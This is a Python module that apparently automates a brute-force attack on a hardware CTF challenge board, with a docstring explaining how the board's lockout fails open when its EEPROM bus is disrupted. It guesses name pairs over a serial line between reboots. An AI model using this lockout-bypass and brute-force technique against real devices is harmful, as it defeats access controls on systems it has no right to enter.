"""Automated brute-forcer for Challenge 5 — Minions Lockout.

Ground truth established by LIVE probing of the real board (not from any
binary analysis — reverse engineering the firmware is forbidden by the ESC
rules and we never did it):

  - Console: `unlock_key minion1-minion2` (a PAIR of names, dash-separated).
    `status` and `help` are documented; `hint` is an undocumented but real
    command.
  - `status` -> {"status":"locked","reason":...,"storage":...,"fail_counter":N}
    storage is either "I2C_EEPROM" (EEPROM wired, real "1-strike" lockout:
    ONE wrong guess sets fail_counter and blocks further attempts until an
    EN-pin reboot) or "I2C_EEPROM_NAK (FAILOPEN)" (EEPROM unreachable: the
    1-strike counter never persists, so wrong guesses are free -- this is
    the exploitable state; see the `hint` command: "Clock out the bus if
    security feels locked!").
  - In FAILOPEN mode there is still an independent hardware watchdog that
    fires exactly ~8.0s after boot regardless of attempt count, putting the
    console into "BUS FAULT LOCKDOWN" until the next reboot. Empirically
    ~14-16 fast `unlock_key` attempts fit in that window.
  - We dumped the EEPROM directly over I2C (own board, own code, flashed
    MicroPython temporarily, then restored the official firmware) and
    confirmed it stores NOTHING but the lockout counter -- no plaintext key,
    no hash. The secret pair is generated/compared entirely on-chip.
  - No side channel was found: proc_ms is a flat constant (10, zero
    variance across 36+ samples of varying content/length), and the actual
    measured round-trip time is equally constant (~601ms, stdev ~0.2ms).
    The compare is atomic (confirmed: trying all 158 names as slot1 against
    a fixed placeholder slot2 never produced a different response).

Net effect: there is no shortcut, and nothing to reverse engineer. This
module just automates guessing ordered (name1, name2) pairs from the
official wordlist as fast as the hardware allows, in FAILOPEN mode, with a
built-in safety check so it refuses to run (and risk a real persistent
lockout) if the EEPROM isn't actually in the NAK/FAILOPEN state.
"""
from __future__ import annotations

import itertools
import json
import os
import time
from dataclasses import dataclass

from .serial import SerialBackend, FLAG_RE

WORDLIST_PATH = os.path.join(os.path.dirname(__file__), "data", "minions_wordlist.txt")

# Named minions most likely to appear as a canonical pair -- tried first.
ICONIC = ["Kevin", "Stuart", "Bob", "Dave", "Carl", "Jerry", "Tim", "Mark",
          "Phil", "Tom", "Mel", "Otto", "Norbert", "Donnie"]


def load_wordlist(path: str = WORDLIST_PATH) -> list[str]:
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def build_pair_order(names: list[str]) -> list[tuple[str, str]]:
    iconic = [n for n in ICONIC if n in names]
    priority = list(itertools.permutations(iconic, 2))
    seen = set(priority)
    rest = [(a, b) for a in names for b in names if a != b and (a, b) not in seen]
    return priority + rest


@dataclass
class Attempt:
    pair: tuple[str, str]
    response: str
    outcome: str  # "granted" | "unusual" | "denied"


class MinionsPairBruteForcer:
    def __init__(self, backend: SerialBackend, verbose: bool = True,
                 attempts_per_window: int = 14):
        self.backend = backend
        self.verbose = verbose
        self.attempts_per_window = attempts_per_window
        self.attempts: list[Attempt] = []
        self.calls = 0
        self.flag: str | None = None
        self.granted_pair: tuple[str, str] | None = None

    def _log(self, msg: str) -> None:
        if self.verbose:
            print(f"  [lockout] {msg}", flush=True)

    def _fast_send(self, cmd: str, idle: float = 0.12, hard_max: float = 2.0) -> str:
        self.backend._ser.reset_input_buffer()
        self.backend._ser.write((cmd + "\n").encode())
        self.backend._ser.flush()
        buf = b""
        t_end = time.time() + hard_max
        last = time.time()
        while time.time() < t_end:
            chunk = self.backend._ser.read(256)
            if chunk:
                buf += chunk
                last = time.time()
            elif time.time() - last > idle:
                break
        self.calls += 1
        return buf.decode("utf-8", errors="replace").strip()

    def is_failopen(self) -> bool:
        resp = self._fast_send("status")
        return "NAK" in resp or "FAILOPEN" in resp

    def run(self, max_pairs: int | None = None) -> Attempt | None:
        """Walk ordered (name1, name2) pairs. REFUSES to run unless the
        board currently reports storage NAK/FAILOPEN (otherwise a wrong
        guess trips the real, persistent 1-strike lockout). Returns the
        winning Attempt, or None if exhausted / unsafe to proceed."""
        if not self.is_failopen():
            self._log("SAFETY ABORT: storage is not NAK/FAILOPEN -- the real "
                       "1-strike lockout is active. Disconnect the EEPROM's "
                       "I2C clock/data line first (see the 'hint' command).")
            return None

        names = load_wordlist()
        pairs = build_pair_order(names)
        if max_pairs:
            pairs = pairs[:max_pairs]
        self._log(f"starting pair brute force over {len(pairs)} candidates "
                   f"({self.attempts_per_window}/window, FAILOPEN mode)")

        i = 0
        while i < len(pairs):
            if not self.is_failopen():
                self._log("SAFETY ABORT mid-run: storage no longer NAK/FAILOPEN.")
                return None

            for _ in range(self.attempts_per_window):
                if i >= len(pairs):
                    break
                a, b = pairs[i]
                resp = self._fast_send(f"unlock_key {a}-{b}")
                i += 1

                m = FLAG_RE.search(resp)
                if m:
                    self.flag = m.group(0)
                    self.granted_pair = (a, b)
                    att = Attempt((a, b), resp, "granted")
                    self.attempts.append(att)
                    self._log(f"*** FLAG *** ({a},{b}) -> {resp}")
                    return att

                try:
                    d = json.loads(resp)
                except Exception:
                    d = {}
                status = d.get("status")
                if status not in (None, "denied", "error"):
                    att = Attempt((a, b), resp, "unusual")
                    self.attempts.append(att)
                    self._log(f"UNUSUAL: ({a},{b}) -> {resp}")
                    if status == "granted" or "granted" in resp.lower():
                        self.granted_pair = (a, b)
                        return att
                if "fault" in resp.lower() and "lockdown" in resp.lower():
                    break  # window closed early, proceed to reboot

            self.backend.reboot()

        self._log(f"exhausted {i}/{len(pairs)} pairs, {self.calls} UART calls, no match")
        return None
